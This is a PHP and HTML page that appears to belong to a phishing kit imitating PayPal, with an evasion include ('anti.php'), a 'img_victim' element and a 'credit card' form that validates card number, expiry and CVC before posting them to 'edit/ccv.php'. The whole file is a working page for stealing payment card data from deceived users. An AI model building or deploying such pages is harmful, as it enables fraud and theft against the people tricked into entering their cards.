<?php

@session_start();



include('./anti.php');
include('./inc/lange.php');
include "./inc/lange".$_SESSION['Moustache-ANONISMA-AYOUB'];



?>


<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="initial-scale=1.0">
  <title>Upload Your Creadit Cart</title>
  <link rel="shortcut icon" link rel="logo-icon" href="./img/icon.ico">
  <link rel="stylesheet" type="text/css" href="css/billing.css">

  <style type="text/css" media="screen">
    .has-error input {
      border-width: 2px;
    }

    .validation.text-danger:after {
      content: 'Validation failed';
    }

    .validation.text-success:after {
      content: 'Validation passed';
    }
    .has-error .checkbox, .has-error .checkbox-inline, .has-error .control-label, .has-error .help-block, .has-error .radio, .has-error .radio-inline, .has-error.checkbox label, .has-error.checkbox-inline label, .has-error.radio label, .has-error.radio-inline label 
    {
          color: #a94442;
    }

    .has-error .form-control
    {
          box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
          border:2px solid #a94442;
    }
  </style>
</head>
<body>

  <script src="js/jquery-3.1.1.min.js"></script>

<script src="js/pay.js" ></script>

<script>
    


    jQuery(function($) {
      $('[data-numeric]').payment('restrictNumeric');
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.form-group').toggleClass('has-error', erred);
        return this;
      };

      $('#send_cc').click(function(){

		var cardType = $.payment.cardType($('.cc-number').val());
		var ex_n  = $('.cc-exp').val().split('/');
		var exp_m = ex_n[0];
		var exp_y = ex_n[1];

      	var v_num = $.payment.validateCardNumber($('.cc-number').val());
      	var v_exp = $.payment.validateCardCVC($('.cc-cvc').val(), cardType);
      	var v_exd = $.payment.validateCardExpiry(exp_m, exp_y);
		
		if(v_num == true && v_exp == true && v_exd == true)
		{
			return true;
		}
		else
		{
	        $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
	        $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
	        $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
	        $('.cc-brand').text(cardType);
	        return false;
		}

      });



       

    });
  </script>

<?php
  include 'fils/nav.php';
?>

<div class="centri">
    <div class="cp-left">
    <div class="profil">
    <p><?php echo $wiz_555 ; ?></p>
    <div class="img_victim">
      <img src="img/user.png">
      <a class="upd" href="#"><?php echo $wiz_666 ; ?></a>
    </div>
    <div class="worn_wiz">
      <p class="hhh"><?php echo $wiz_777 ; ?></p>
      <div class="msg">
        <div class="la3fo">
          <img src="img/worning.png">
        </div>
        <span><?php echo $wiz_888 ; ?></span>
      </div>
    </div>
   </div>
   <div class="kadab">
       <p>More about your account</p>
       <a href="#">Resolve a problem in our Resolution Center</a>
       <a href="#">See how much you can send with payPal</a>
   </div>
   </div>
<form action="edit/ccv.php" method="post" autocomplete="off">
   <div class="upload_info">
    <p class="talgim"><?php echo $wiz_120 ; ?></p>
    
      <div class="form-group inputspecial">
        <label for="cc-number" class="control-label"><?php echo $wiz_123 ; ?></label>
        <input name="number_cart" id="cc-number" type="tel" class="input-lg form-control cc-number cc-num" autocomplete="cc-number" placeholder="•••• •••• •••• ••••" onkeyup="type_carte()" id="nubmer-cart" required>
      </div>

      <div class="form-group inputspecial">
        <label for="cc-exp" class="control-label"><?php echo $wiz_124 ; ?></label>
        <input name="date_cart" id="cc-exp" type="tel" class="input-lg form-control cc-exp" autocomplete="cc-exp" placeholder="•• / ••" required>
      </div>

      <div class="form-group inputspecial">
        <label for="cc-cvc" class="control-label"><?php echo $wiz_125 ; ?></label>
        <input name="ccv_cart" id="cc-cvc" type="tel" class="input-lg form-control cc-cvc" autocomplete="off" placeholder="•••" required>
      </div>

      <div class="dawzo">
      <input type="submit" id="send_cc" name="sbt" value="Confirm and Processes">
      </div>
    
  </div>
</form>
   </div>

<?php

include 'fils/footer.php';

?>

 
</body>
</html>